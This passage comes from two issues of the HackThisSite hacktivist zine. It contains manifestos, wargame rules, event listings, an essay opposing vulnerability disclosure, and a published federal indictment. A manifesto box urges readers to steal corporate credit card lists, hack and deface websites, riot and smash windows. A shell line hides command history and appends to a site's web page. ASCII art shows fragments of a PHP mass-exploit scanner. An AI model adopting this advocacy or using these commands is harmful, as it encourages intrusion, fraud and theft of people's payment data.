ILF cells operating independent of each other with different goals but under the
same points of unity allows a diversity of tactics as well as empowering others
a way of tuning in and joining the struggle.

While the proposed points of unity can serve as a useful guideline for people
who are organizing their own hacktivist cells, it is by no means a strict code
which demands obedience. People are free to use and reuse this code as they see
fit, and are free to make modifications and reuse the name if it suits their
purposes. Hacktivists of world, unite! 

                            !!!!!!!!!!!!!!!!!!!!!!!
                            ! ILF POINTS OF UNITY !
                            !!!!!!!!!!!!!!!!!!!!!!!

1. We recognize that the established order of corporations and governments stand
in the way of achieving an open internet and a free society.

2. We utilize a diversity of tactics in achieving our goals, ranging from
digital rights hacktivism like building and protecting alternative channels of
free secure communication as well as direct action hacktivism against those who
are actively working against a free internet.

3. We need to break out of the digital realm and coordinate with and participate
in political protests around the world. Our resistence must by global: on the
streets and on the net!

4. The very interest in the subject will label yourself as a criminal in the
eyes of the state. To protect yourself and others in the movement, we need to
facilitate and build a culture of security. Organize in a decentralized
anonymous way, communicate securely, don't rat on others, and become a ghost.

5. The Internet Liberation Front belongs to nobody and everybody. Anyone who are
acting under these points of unity are considered an operative of the ILF, and
are free to utilize and build upon the name and ideals. 

A scenerio: Microsoft is hired by the Chinese government to develop systems that
block political websites. First, digital rights hacktivists circumvent their
censorshipby developing open publishing software(like Freenet, IndyMedia, and
file sharingservices) so we can communicate securely and anonymously. Then
direct actionhacktivists orchestrate attacks on both Microsoft and Chinese
computer networkswhile publically releasing the source code to the Windows
operating system. Press releases are sent out to the media. The birds chirp.
The sun rises.

################################################################################
#                            Right-wing Subversion                             #
################################################################################

Scattered throughout this issue is a series of graphics advocating random acts
of destruction and violence. These were made and distributed by the CIA to
create instability and unrest in democratic countries. The US government
replaced several governments with right-wing puppet dictators friendly to the
interests of the US economic and political system. This pamphlet was called the
""Freedom Fighter"" manual.

Every day we are bombarded with media that tries to control not only what we
think, but what we think about. We care more about Janet Jackson's nipple on
television then we do economic inequalities, international instability, or the
impendingenergy crisis. The televisions telling us to purchase the latest
cleaning products while billions around the world do not have healthy drinking
water. Reality TV? Fox News? Fair and balanced?

If you want to change society, change yourself. Change the words you use, change
the media. Use their propaganda against themselves. Subvert their images. 

adbusters.org / subvertise.org / radicalgraphics.org
abc.net.au/arts/headspace/rn/bbing/trouble/

~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*
No matter how bad another four years of the Bush administration is going to be:
we will not let the madness of war happen in our name. Tens of thousands of
people descended upon Washington D.C.to counter the Inaugural March to declare
that  This Is Not Our President, and This Is Not Our War. Nevermind the ballots,
reclaim the streets!
~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*
... the next level of hacking challenges ... www.RootThisBox.org
~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*
Root This Box is a live hacking challenge where users can practice their attack
and defense skills on machines set up for free range hacking. People form teams
with other users and compete against other teams for control over these
machines. When a machine is taken over, the team can put up a message and try to
defend the machine against other attacking teams. 

Tournament Play
--------------------------------------------------------------------------------
Points are rewarded to teams based on the number of machines they have control
of, what services they have running, and how long they can hold it. At the end
of the month, the final scoreboard and team rankings are archived and reset as
control over the servers are returned to their original owner to reconfigure and
rerelease. 

How do you play?
--------------------------------------------------------------------------------
The object of the game is to be hack and take over a system and gain enough
access to modify the hack.html static page in the web root. You have to update
this file with the name of your team and your message to the world. For a
working hack.html page, check out our example. Our scripts parse these files on
an hourly basis and update your team scores in our database. From here, you have
to defend the box against other teams who are also trying to take over. The
longer you hold the most amount of boxes, the more points you get. 

Box Submissions
--------------------------------------------------------------------------------
The servers in this competition are submissions from users just like you. If you
have an extra machine of any kind that you can throw on a network somewhere,
consider setting it up for Root This Box! We like a diversity of configurations,
hardware specs, and operating systems. Some box owners like to intentionally
plant vulnerabilities, backdoors, or outdated software just to make the game
more interesting. If you are interested in submitting a machine, please read the
setup guide for specific details on how to configure your box for the
competition. 

How to Set up a machine for Root This Box
--------------------------------------------------------------------------------
The game depends on having boxes set up and supplied from users just like you.
If you have a spare machine lying around near a stable internet connection,
consider submitting your box for the challenge. This guide will provide you with
specific details and requirements for setting up a system to be entered in the
Root This Box competition. 

System Requirements
--------------------------------------------------------------------------------
While you are encouraged to try a diversity of operating systems and
configurations, there are some standards that need to be respected in order for
it to work properly in our challenge. You are required to have a static IP
address or host or some sort of dyndns.org service. You are also required to run
some sort of web service on port 80 that can deliver html files. If you are
behind any sort of router or firewall, you need to make sure that it is
configured to forward traffic (on at least the ports for the services you want
to be running) to your box's local IP address so people can connect in. The
machine should be hosted on a relatively speedy and stable internet connection
and should be running as much as possible. You also need to put a static html
page in your web root called hack.html which our scripts will crawl and parse on
an hourly basis for scoring purposes. This contains information like who is
currently owning the box and what services are running. 

Fun Options
--------------------------------------------------------------------------------
Setting up a box and closing all services is no fun. Many people are putting
together various configurations and even known vulnerabilities for users to play
with. Of course, you are free to set up the box however you please, but we have
a few recommendations. Many people are creating low level accounts and allowing
users to ssh or ftp into the box to have at least a low level of access to play
around with and to launch further attacks which may elevate permissions. If you
choose this route, make sure you set up a cron to reset the pass back to it's
default every five minutes or so otherwise someone is going to set it to
something else and no one else can connect. If you need any help,you can get a
hold of the RTB staff @ the IRC server irc.hackthissite.org (ssl 7000) in
#rootthisbox
~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*



~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*
Graffiti Contest
~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*
Reclaiming public space has been a pasttime of hackers and revolutionaries
alike. This issue, we're starting a hacktivist graffiti contest. We want to see
pictures of your best hacker or activist related tags. In a world where public
space is sold to the highest bidder, graffiti is a medium of expression not
controlled by corporations or government. So grab a can of spraypaint and hit
the town! It's amazingly easy from making stencils to wheatpasting posters to
just carrying a sharpie around with you. A blank wall is a blank mind! Grab a
can of spraypaint and hit the town! Send all contributions to xec96 at
hackthissite.org. Include an image, your city, and your name.
billboardliberation.com, subvertise.org, radicalgraphics.org sniggle.net
~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*~*

                    !######################################!
                    !###   HACK THIS SITE SUMMER 2005   ###!
                    !######################################!
            
DISTRIBUTE ME WIDELY AND WILDLY!
-------------------------------------------------------------------------------- 
This community publication is entirely free to own and free to share. We can
only afford to publish a limited amount of copies, so we are counting on people
to help pass it on to friends, local computer stores, hacker groups, 2600
meetings, libraries, bookstores, newsstands, etc. 

ANTI-COPYRIGHT INFORMATION
--------------------------------------------------------------------------------
Everything provided in this publication is anti-\opyright. feel free to use and
reuse any of the content provided here in your own projects. You're a part of
this movement - spread the word! 

CONTRIBUTE TO NEXT ISSUE!
--------------------------------------------------------------------------------
We are always accepting additions. If you have anything to share about the
latest exploits, hacktivist actions, or any other happening in the scene, send
it in! We accept a variety of different mediums: from writings, images, ascii
art, links, technical documents, etc. There are a number of ways you can get
involved, from submissions to grammar/editing or graphic design. Check out our
zine forums or get in touch with the zine staff. 

MAIL ORDER
--------------------------------------------------------------------------------
Physical copies are available for mail order through Hack This Site's website.
Single copies are $5, and ""anti-propaganda"" packages which come with five
magazines plus a flaming heap of underground newsletters,posters, leaflets,
stickers, patches, etc. are available for $25. 

ELECTRONIC COPIES
--------------------------------------------------------------------------------
While we charge for physical copies of the zine to cover production costs, we
believe that all information should be free to read and distribute. Electronic
copies of the zine are available in a variety of formats on our website. Please
distribute to various file sharing services, text file collections, etc.

Graphical PDF file: the complete magazine with complete graphical layout, ideal
for printing additional copies of the zine. See the Do It Yourself Distro below
for additional printing instructions.

Raw .TXT file: ideal for lynx users or
quick and speedy distribution in file sharing services, BBSs, through email,
etc.

Forums: Most of the articles in this zine are available at the zine forums
on our website in TXT format, where people can add comments. 

DO IT YOURSELF DISTRO! 
-------------------------------------------------------------------------------- 
We've received countless stories of HTS people reprinting copies of the zine on
their own and giving it away to everyone they know - at school, work, 2600
meetings, etc. Now's your chance to do the same. All you need is access to some
printer and PDF copies of the zine.

There are two files for the zine: one is the color cover and the other is the
black and white inside pages. It is formatted double sided so that when printed
it can simply be folded in half. If you are using a printer that can only print
in single sides, print with one sheet of paper, turn it around and print the
second page on the other side repeating for the remaining pages.

The cover PDF file is high resolution color and ideally would be best printed on
glossy color paper. But if all you have is black and white, then go with it! 

Assemble the printed pages and use a long style stapler to bind them together.
They have these available at universities, copy shops, art and craft stores,
etc.

If you are distributing copies(especially outside the U.S) and want to make them
available to others, let us know so we can announce your information to the Get
Local section of the zine website. 

Get Involved with Hack This Site
--------------------------------------------------------------------------------
This movement is entirely what you make of it. We are structured in such a way
that allows people to tune in voice their opinions and make decisions about the
direction of the site and community. Check us out on IRC, go to national actions
and conventions(listed to the right) and get involved!

       WWW: http://www.hackthissite.org          IRC: irc.hackthissite.org
       EMAIL: htsdevs@gmail.com              #hackthissite (SSL port 7000)      

                             The Usual Suspects:

     *      ---------      *      ---------      *       ------          *  
     *      HTS STAFF      *      ZINE TEAM      *       OTHERS          *
     *      ---------      *      ---------      *       ------          *
     *      Xec96          *      Xec96          *       smooth operator * 
     *      ikari          *      alxCIAda       *       weiznit         *
     *      IceShaman      *      Zortexia       *       Morklitu        *
     *      buz            *      whooka         *       forcemaster     * 
     *      archaios       *      Fetus          *       BIG C           *
     *      hairball       *      Wyrmkill       *       archangel_      *
     *      whooka         *      mushroom5698   *       darkangel       * 
     *      html           *                     *       Truckle         *
     *      OutThere       *                     *       Phate           * 
     *      br0kenkeychain *                     *       Wells           *
     *      Zortexia       *                     *       Brett           *
     *      alxCIAda       *                     *                       *
     *      Mcaster        *                     *                       *
     *      The_Anarchist  *                     *                       * 
     *      weekend        *                     *                       *
     *      psyche         *                     *                       * 
     *      \alive         *                     *                       *
     
Thanks to hbx networks, chicago 2600, dikline, those who refused to provide 
statements to the feds, IndyMedia, and the fine people at kinkos who helped 
us steal copies. 
Zortexia thanks alxCIAda, JK-63, archangel_darkangel 
Wyrmkill thanks whooka, morklitu and mushy

################################################################################
#                           Actions and Gatherings                             #
################################################################################

Hacker Conventions
--------------------------------------------------------------------------------
- DEFCON 13 July 29-31, Las Vegas www.defcon.org 
- WHAT THE HACK July 29-31, Netherlands www.whatthehack.org 
- Hackers on Planet Earth 6 Summer 2006, New York City 2600.com 
- 2600 Meetings First friday of every month @ a city near you: 2600.com/meetings

Free Spirits
--------------------------------------------------------------------------------
- Burning Man August 29 2006, Nevada www.burningman.com
-Rainbow Gatherings June 1-7, Virginia www.welcomehome.org

Protests
--------------------------------------------------------------------------------
- Anti-G8 Actions July 6-8, Scotland www.dissent.co.uk
- Biodemocracy 2005 June 18-21st, Philadelphia www.ReclaimTheCommons.net

Other Events
--------------------------------------------------------------------------------
- Anarchist Bookfairs and Festivals San Francisco, Madison, Montreal, and More

          Plug in at indymedia.org or infoshop.org for more actions!

################################################################################
#                                                                              #
#  Call in sick. Skip school. Go do something you always wanted to do. Take    #
#  over an intersection with a bunch of people and music and start a dance     #
#  party. Send fake emails posing as your boss and announce raises for         #
#  everybody. Get food that would have otherwise been thrown away and give it  #
#  to people who need it. Fuck with rich people. Say hi to everyone you pass   #
#  on the street. Cross out words like oppression, exploitation and boredom    #
#  in every dictionary. Write your own music and play it for free. Organize a  #
#  local anti-capitalist collective to strike terror in the hearts of the      #
#  bosses and rulers. Call someone on their shit everytime when they say       #
#  something racist, sexist or homophobic. Write your own newsletter. Op       #
#  everybody in an IRC channel. Do graffiti to add life to your town. Help     #
#  the elderly cross the street. Whenever possible, ride a bike, walk, or      #
#  take public transportation instead of using a car. Refuse to always be a    #
#  spectator. Call someone you haven't talked to in a while. Steal corporate   #
#  credit card lists and donate money to charities. Heckle your boss and/or    #
#  union bureaucrat whenever possible. Program a free open source alternative  #
#  to a commercial software application. Participate in a riot. Start a        #
#  community garden in an abandoned lot. Educate others on historical          #
#  revolutionary upheavals. Find some buckets and use them as drums at the     #
#  next protest to make it more lively. Hack a corporate or government         #
#  website and fill it with anti-capitalist messages. Start a radical          #
#  cheerleaders squad. Write ""This is your death"" on every piece of money you  #
#  can. Sneak your own art into museums. Steal books from big corporations     #
#  and give them to strangers. Trainhop or hitchhike accross the country. On   #
#  stop signs, add stickers that say ""racism"", ""sexism"", ""capitalism"", etc.    #
#  Think for yourself, question everything. Squat a vacant building. Confront  #
#  fascists everytime you see them. Throw a brick through a major              #
#  corporation's window. Start an infoshop. Create a rank and file             #
#  organization at your workplace. Monkey wrench the system. Steal someone's   #
#  heart for a day. Falsify invitations to a yuppy art gallery and pass them   #
#  out to the homeless. Celebrate every holiday of all countries and culture.  #
#                  And carry a new world in your heart.                        #
#                                                                              #
################################################################################"
Papers,HackThisZine (HTZ) #4 - Ammo For The Info-Warrior,eZine,,2006-12-31,: N/A,"# unset HISTFILE; ./clean.sh; cat >> /var/www/hackthissite.org/html/index.php
################################################################################

                                               if         co        earc
                          targetcoun            imit      ($       $x <
                        x] = eregi_repl          //""      ta     [$x])
                      x]); //    onstruct           =     p[    $ext
                     ($temp)        ) { $ext       $te         ""; 
                     ][$i]->          se,80,$e                       conte
                   SQL $sploits           ploit($b                  loits[$l
                  );}}  }  }fu              oit() //     oit!
                fork); $l++) {                < count($fork[
             t subgroup (XSS,SQL in              $targe        ay();
           gle4Targets(""ww         com                             le th
        unt > $searchlimi  exploit  ighe
        x = 0; $x < $targ  code not  +) {
      targets[$x]); $temp  people!  ""/"",$t
      p[0]; $extend = ""/""           1; $r<
     $r].""/""; } if($l == 0) // UPLOAD $spl
     lname,$shellcontent); elseif($l == 1)
     extend,$sploits[$l][$i]->SQLQ,$user,$
     oit routine { for ($l = 0; $l < count
      [$l]; $i++) // all forks of current
       = array(); $targetcount = 0; Googl
        // google them if ($targetcount>
        count = $searchlimit; for ($x =
          replace(""http://"", """",$targ
            truct URL $base = $temp[
              { $extend .= $temp[
                   ,$extend,
                   
see you on the front page of the last newspaper those motherfuckers ever print!

################################################################################
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   _____                             _____                __  .__            
  /  _  \   _____   _____   ____   _/ ____\___________  _/  |_|  |__   ____  
 /  /_\  \ /     \ /     \ /  _ \  \   __\/  _ \_  __ \ \   __\  |  \_/ __ \ 
/    |    \  Y Y  \  Y Y  (  <_> )  |  | (  <_> )  | \/  |  | |   Y  \  ___/ 
\____|__  /__|_|  /__|_|  /\____/   |__|  \____/|__|     |__| |___|  /\___  >
        \/      \/      \/                                         \/     \/ 
.___        _____                                             .__              
|   | _____/ ____\____           __  _  _______ ______________|__| ___________ 
|   |/    \   __\/  _ \   ______ \ \/ \/ /\__  \\_  __ \_  __ \  |/  _ \_  __ \
|   |   |  \  | (  <_> ) /_____/  \     /  / __ \|  | \/|  | \/  (  <_> )  | \/
|___|___|  /__|  \____/            \/\_/  (____  /__|   |__|  |__|\____/|__|   
         \/                                    \/                              

     Electronic Civil Disobedience Journal !! Published by HackThisSite.org     
     
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
################################################################################

                           anti-(C)opyright 2006
This zine is anti-copyright : you are encouraged to Reuse, Reword, and Reprint
everything in this zine as you please. This includes: printing your own copies 
to distribute to friends and family, copying and pasting bits of text in your
own works, mirroring electronic versions to websites and file sharing services,
or anything else you could think of - without asking permission or apologizing!


The Summer '06 issue of the zine has possibly our best collection of articles
yet and is published in full color in time to distribute at our vendor table and
guerrilla workshop at the sixth Hackers On Planet Earth conference in NYC.

Mind you, this was no easy feat, in fact it was through a series of miracles
that we had ended up in NYC at all. The night before we hit the road we still
had a lot of editing to do on the zine, not to mention printing copies. So to
celebrate we decided to hold an acoustic show and trip on psychedelics all night
long. Around 10 in the morning reality started to creep back up on us and we
spent many long hours hopped up on caffeine trying to arrange the pages of the
zine while packing our HOPE supplies. We were quite literally finishing up the
PDF on the road to NYC while driving eight people in a single car. Not to
mention that one of us had to ask permission from the judge to leave the state
to go to the hacking convention while facing federal felony hacker charges!

At last we had made it to NYC to the convention site and immediately set up our
table and met up with several other Hackbloc'ers/HTS'ers waiting for us.  We had
to make several printing runs because each time we had brought new materials to
the table they had been taken within fifteen minutes. All of the propaganda we
were giving away, including new and old HTS zines, cds of the
DisrespectCopyrights.net file archive, newsletters for the People's Free Space,
and other posters pamphlets and propaganda, were given away for free. This is an
amazing feat considering the time energy and resources we have put into
developing this, also considering that this year they were asking us for $250 to
table while at the Fifth HOPE we had tabled for free.

We had also organized a guerrilla workshop on hacktivism on Sunday. Unlike most
of the other presentations and lectures, we arranged chairs in a circle so that
we could have a round table collective meeting where everyone was welcome to
participate without any top down hierarchy. Dozens came to have focused
discussion on past and present examples of hacktivism, setting up hacker spaces
around the country, security culture both on the internet and in our
organizations, and future goals of hacktivism. We also discussed the various
meanings and interpretations of the word Hacktivism, including prankster culture
jamming hacktivism such as the Yes Men, online civil disobedience such as the
Electronic Disturbance Theatre, fighting censorship such as the Hacktivismo
project, developing a free and secure internet such as Tor, Freenet, and
Guerrillanet, the need to set up computer co-ops and offer free internet and
technology for the public, and defending free speech and open publishing systems
such as IndyMedia.

Compared to the hacktivist movement worldwide which already has a network of
several dozen hacker spaces and squats, we still have a lot of work to do.
However, during the weekend we had made several valuable contacts and had
developed several ideas for future hacktivist related projects. Although we have
a long road ahead, our experiences with HOPE has given us inspiration and the
opportunity to learn and share with other hackers and activists from around the
world.


                     !####################################!
                     !####    TABLE OF DISCONTENTS     ###!
                     !####################################!
                                                
                               -NEWS and INTRO- 
                  Zen and the Art of Non-Disclosure      - 01
                  Anti-DRM Flash Mob                     - 02
                  U.S gov. Indicts Hacktivist            - 03

                                 -THEORY-
                  Fear and Paranoia                      - 04
                  How the Net was Lost                   - 05
                  Consumerist Society Revisited          - 06
                                    
                                 -SKILLS-
                  Disrespect Copyrights in Practice      - 07
                  Advanced Cross-Site-Scripting          - 08
                  Cellular Suprises                      - 09
                  Exotic vulnerabilities                 - 10
                  Windows BOF Adventures                 - 11
                  Deus Ex Machina: Artificial Hacker     - 12                  
                                    
                                 -RECIPES-
                  Use ""Off the Record"" Messageing        - 13
                  Start a Wargames Competition           - 14
                  How to Start a HackBloc                - 15
                  Start A Free Pirate Shell Server       - 16     
                             
                                 -ACTION-
                  Free the Sagada 11                     - 17
                  Let's Throw A PIRATE PARTY             - 18
                  Capture the Flag                       - 19
              

                     -####################################-
                     -####       NEWS and INTRO        ###-
                     -####################################-

################################################################################
#                    01. Zen and the Art of Non-Disclosure                     #
################################################################################

 As hackers, squatters, scammers and phreaks, we are often asked, ""That's
amazing, how do you do it?"" Yes, there still is magic out there, but it's not
going to find you, nor will you find it through a google search*.

 It's a vulnerability so long as the vendor isn't informed and releases a patch;
it's a squat so long as it's ""legal owner"" doesn't find out and kicks you out;
and it's an underground party so long as no one slips up and police raid the
place. Same goes for sneaking into theatres, copy hookups, and other scams.

 How do we keep these tricks alive? By keeping them a secret only to those who
need to know. A magician never reveals her secrets lest it will cease to be
magical. You will likely never hear the magician's true name either. 

 Why do people publicly release these tricks in the first place, and what
effects does this have? Those vulnerable to the trick will likely find out and
promptly patch their weaknesses. And law enforcement will have an opportunity to
learn and train themselves as well as find out who to bust. Or the trick will
fall into the wrong hands and be counter-productive (script kiddies, right
wingers, fascists, etc). 

 All so you can get your name on some security list as the one who ""found it
first"", and in all probability, you probably weren't the first anyway, as the
real people who made the discovery would want nothing to do with such lists to
begin with. And they probably have a billion more important ways of applying the
trick in the first place. 

 So before you spill the beans, ask yourself whether there are people who need
these tricks more than you do, or whether there are already such people at work
and would full disclosure jeopardize their secret plans?
  That being said, we can move on to more pressing issues: how can we help the
hacker movement to learn and grow without giving away and spoiling all our
tricks? This was the big question as we were putting together this issue of our
zine, thinking about whether we should publish instructions on 'how to hack X
and hack Y'. Certainly we don't want to become some ""eliter than thou"" clique
because it again becomes about individual ego and not the community, and while
individuals come and go, ideas last forever. So we have to train ourselves and
others willing to learn, but find a way to do it in a carefully calculated
manner. And it's not gonna happen by giving away proof-of-concept code but by
teaching the approach and technique so people can figure it out for themselves.

 I don't think that was our conscious goal of Hack This Site but it certainly
was the result. We wanted to introduce people to the wild world of hacking so we
put together several series of hacking challenges modeled after real websites
with real vulnerabilities. Creating this safe and legal training front group*,
people were able to jump in and start with the basics, not by downloading
exploits or ""appz"", but by hands-on security research. People sometimes give us
shit because we're dominated by newbies or that we are aiming too low. Rest
assured, there are plenty of us with skill waiting in the background waiting for
YOU to start asking the right questions so the real training can begin. Yes, we
want to share our shit with those who want to learn.

 Before you can walk, you have to learn to crawl. And when you can walk you can
be shown the path. And this is what every white-hat, security consultant, or
full-disclosure advocate fails to see: we can show you the path, open the door,
and offer you the red pill, but you have to take that first step and become that
black hat hacktivist ninja.

 Cause you're not helping anybody when you alert the vendor or post that 0day
proof of concept code.
 Or get that full time computer security job for the phone company.
 Or turn in your buddies to the FBI when the going gets tough.

 This is what is known and loathed as ""selling out"", and it helps nobody but the
forces which are working to destroy the hacking movement. The people who are
seduced into it either end up regretting it or lose a bit of their humanity in
the process of becoming a zombie worker bee for the Establishment.

 So you've gone this far, but where are we going and what do we do next? You've
probably realized this world isn't a very friendly place for not just black hat
hacktivist ninjas but for most people in general, unless you happen to be in
that top 1% where you have your own mansion, private jet and congressman. Every
day we hear about how hackers and activists are criminals and terrorists. If you
watch television you are also probably tired of hearing about how illegally
tapping your phone or reading your mail protects os from terrorism, or how
another thousand dead babies in Iraq is a Strong Victory for Worldwide
Democracy. So instead of boring you and further let me encourage you to Turn Off
That Television and Get Involved with your Community cause Now is the Time to
Act:
 
 
¥ get involved with your local indymedia center to tell the stories corporate
media ignores
¥ set up servers for radical websites and email lists and teach them how to
communicate securely on the internet
¥ find ways to get shit for free(free copies, free internet, free public
transportation, etc) and share it with those who need it the most
¥ help develop the next Internet, one that is free from NSA spooks, traffic
shaping, hierarchal domain authorities, or corporate control in general
¥ help inspire those who will grow to be bigger stronger and smarter than you or
I who will deal that final blow against capitalism and the state

 There is still magic out there for those who seek it: don't wait for it, it
waits for you!

################################################################################
#           02. Anti-DRM Flash Mob Hits Apple Stores in Eight Cities           #
################################################################################

In a coordinated action at 8 cities across the United States, technologists
donned bright yellow Hazmat suits and swarmed Apple Stores, warning shoppers and
staff that Apple iTunes is infected with Digital Restrictions Management (DRM)
and that Apple's products are defective by design.

The technologists displayed posters mocking Apple's marketing campaign, with
graphic images of a silhouetted iPod users bound by the ubiquitous white earbud
cord. The group claim that as the largest purveyor of media infected with DRM,
Apple have paved the way for the further erosion of users' rights and freedoms
made possible by the technology.

The coordinated protest was organized by DefectiveByDesign.org, a direct-action
campaign targeting Big Media and corporations peddling DRM. ""In the 17 days
since the launch of the campaign we have had more than 2,000 technologists sign
the pledge to take direct action and warn people about DRM"" was how campaign
manager Gregory Heller described the explosive grassroots effort.


About a dozen activists gathered in Chicago at the Apple store on Michigan Ave,
the busiest shopping area of Chicago, to protest Apple's use of Digital ""Rights""
Management technology. Members from the local Chicago Linux Users Group
(chicagolug.org), Free Software Foundation(fsf.org), Defective By
Design(defectivebydesign.com), and Hackbloc Chicago(hackbloc.org/chicago) had
helped organize the event by bringing bio-hazard suits, anti-DRM signs and
stickers, and posters of people getting roped up by their iPod cords mocking the
official Apple ads. Shoppers stood in awe and curiosity as we ran around the
front of the store in a panic, handing out flyers and otherwise creating a
public spectacle. Several Apple employees gathered by the front entrance of the
store preventing us from entering the store while refusing to comment on Apple's
use of DRM technology.

More information, see www.defectivebydesign.com or www.fsf.org

Pirate Party Condemns Raid on File Sharing Servers
June 3rd, 2006: Pirates gather in Stockholm to protest the May 31st police raid
on over a hundred servers related to The Pirate Bay, Piratbyryn, and more.
Demonstrators demanded that the Swedish government should seek a comprimise on
the file sharing issue rather than criminalizing more than a million Swedish
citizens.

################################################################################
#                 03.  US Government Indicts Hacker Activist:                  #
#                 Felony Computer Fraud and Abuse Act Charges                  #
################################################################################

The US District Attorney and the FBI has pressed felony charges against Jeremy
Hammond, hacker activist and founder of website HackThisSite.org, related to the
alleged hacking the website of the right-wing hate group ProtestWarrior.com. The
indictment issued on June 26, 2006 follows an FBI investigation lasting more
than a year since Jeremy's apartment was raided in March '04 and accuses him of
violating the Computer Fraud and Abuse Act.

The US DA alleges that Jeremy was involved with a hacker group known as the
Internet Liberation Front that allegedly hacked into and gained access to the
entire database belonging to the right-wing hate group ProtestWarrior.com.
Originally, ProtestWarrior has baselessly accused Jeremy of 'intending' to use
credit card data to make donations to leftist and charity groups, although the
FBI is not making any accusations related to intending or actually using credit
card data.

Despite that no damage has been done to the ProtestWarrior.com server, nor has
any personal details or credit card information has been released or used,
Jeremy is facing serious felony charges which could result in jailtime and
massive fines.

Jeremy is still ""free"" on a unsecured bond which imposes several strong bail
conditions which includes submitting to regular drug testing, surrendering the
right to a passport or leaving the state without the judges permission, and no
use of the computer / internet except for ""web designing for business purposes""

Jeremy has not testified against, provided evidence, or incriminated anyone else
and has not cooperated with the FBI in any investigation or prosecution. He is
the only one who has been arrested in connection with this alleged hacking
indicent.

Ironically enough, a former friend and administrator who had helped Jeremy work
on the HackThisSite.org website was responsible for informing ProtestWarrior.com
of the attack and has provided so-called evidence to the right-wing group which
was engineered to make Jeremy look like the perpetrator of the alleged hacking
incident. This is apparently what was responsible for the initial search warrant
on his apartment, and if brought up as evidence during the trial, will hopefully
be thrown out on grounds of heresay due to the chain of custody.

At the most recent court date, the DA asked Judge Zagel to formally admonish
Jeremy for his history of criminal behavior, most of which has involved minor
misdemeanors for political protest related events. Following a recent arrest for
'chalking sidewalks', the judge warned Jeremy that any future arrests would
result in either home confinement with electronic surveillance on his dollar, or
completely revoke his bail and put him in jail until the results of the trial.
As the Judge describes, Jeremy ""no longer has the same freedoms"" he once held.

Jeremy is now staying out of any direct action or illegal activities and major
protests which could result in arrestable situations, both for his safety and
the safety of others. After a 10 day Vipassana meditation course, he is also
seeking mediation which those who he has wronged, or those who currently have
issues with him, with the intent of resolving political issues in the community
as well as for his personal development.

While federal prosecuters claim that this is being treated as a standard
criminal charge, it is obvious that this is a politically motivated trial as the
amount of money the FBI has spent investigating and prosecuting this 21 year old
activist doublessly exceeds the next-to-no damages done to the right-wing
ProtestWarrior.com website.

As an activist who has worked to help and teach people all his life, we ask the
federal prosecutors and the judge that Jeremy not be given any jailtime for a
'crime' that has resulted in no damage to any property or person.


full text of the indictment:
UNITED STATES DISTRICT COURT 
NORTHERN DISTRICT OF ILLINOIS 
EASTERN DIVISION 

UNITED STATES OF AMERICA vs JEREMY A HAMMOND 

Violations: Title 18, United States Code, Sections 1030(a)(2)(C) and 2 

COUNT ONE  SPECIAL FEB 2005 GRAND JURY charges:

1. At times material to this indictment: 
a. ProtestWarrior.com was a website that promoted certain political opinions.
ProtestWarrior.com's website was maintained on a computer server located in
Miami, Florida. Visitors to the ProtestWarrior.com website could become members
of the website, and could purchase items and make donations through an online
store using a credit card. As a result, the ProtestWarrior.com computer server
contained databases that included personal information about visitors to the
website, including credit card account information, home addresses, names, and
other identifying information. These databases on the computer server were not
available online to the general public. Rather, only authorized users who had
been issued passwords by the administrators ProtestWarrior.com were permitted to
access these databases of personal information 

b. Defendant JEREMY ALEXANDER HAMMOND was an administrator of the website
hackthissite.org which described itself as ""an online movement of hackers,
activists and anarchists."" 

c. Between January and February 2005, defendant HAMMOND accessed
ProtestWarrior.com's server without authority on multiple occasions in an effort
to obtain information not otherwise available to him or the general public,
specifically, credit card numbers, home addresses, and other identifying
information of the members and customers of ProtestWarrior.com. 

2. On or about February 1, 2005, at Chicago, in the Northern District of
Illinois, Eastern Division, and elsewhere, JEREMY ALEXANDER HAMMOND, defendant
herein, by interstate communication, intentionally accessed without authority
ProtestWarrior's server, a protected computer, and thereby obtained information,
namely credit card numbers, home addresses, and other identifying information of
its members and customers, from that protected computer; In violation of Title
18, United States Code, Sections 1030(a)(2)(C) and 2 

FOREPERSON : UNITED STATES ATTORNEY

                     -####################################-
                     -####           THEORY            ###-
                     -####################################-
                     
################################################################################
                    
#             04. Fear, Paranoia and Mental Health for Hacktivists             #
################################################################################

 ""There is this thing keeping everyones lungs and lips locked, it is called fear
and its seeing a great renissance."" -The Dresden Dolls

Every day I woke up with an overwhelming sense of dread. I couldn't leave my
bed, I was locked in my head, locked in my a room of my own making in my mind.
Trapped in a cage that I could not get out of. Fear had finally consumed me,
along with its twisted cousin paranoia. I new that I had to get out of this
state, this room. I couldn't get out of my own head though, there has never been
a jail more unescapeable than the one within our own minds. What happened to me
is not an uncommon story. It happens all the time to hackers and activists and
anarchists. We have the virtue of seeing many of the things that are really
